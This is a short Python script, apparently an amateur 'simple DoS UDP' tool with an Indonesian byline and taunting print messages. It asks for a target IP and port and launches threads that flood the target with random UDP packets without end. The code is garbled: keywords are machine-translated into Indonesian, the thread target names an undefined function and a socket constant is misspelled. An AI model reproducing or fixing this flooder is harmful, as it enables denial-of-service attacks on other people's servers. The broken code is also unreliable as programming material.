#simpledosudp
#codebyAtha
 soket impor
impor  acak
 benang impor
impor  os , sys

print ( "GAS KENN DDOS SERVER GADA ATTITUDE" )

ip_tod  =  str ( masukan ( "Ip Target : " ))
port_tod  =  int ( input ( "Target Pelabuhan : " ))
paket_tod  =  int ( input ( "Paket Dari Hengker : " ))
threads_tod  =  int ( input ( "Thread Dari Hengker : " ))
os . sistem ( "jelas" )

def  wibu ():
    asu  =  acak . _urandom ( 1024 ) #ubah angka urandom= kerusakan
    sedangkan  Benar :
        coba :
            s  =  soket . soket ( soket . AF_INET , soket . SOCK_GRAM )
            s . sambungkan (( ip_tod , port_tod ))
            s . kirim ke ( asu )
            untuk  x  dalam  jangkauan ( paket_tod ):
                s . kirim ke ( asu )
            print ( "[•] YAHAHHAA!!!" )
        kecuali :
            print ( "[•] MAMPUS MAMPUS!!!" )

untuk  y  dalam  jangkauan ( threads_tod ):
    th  =  benang . Utas ( target = Hengker )
    th . mulai ()
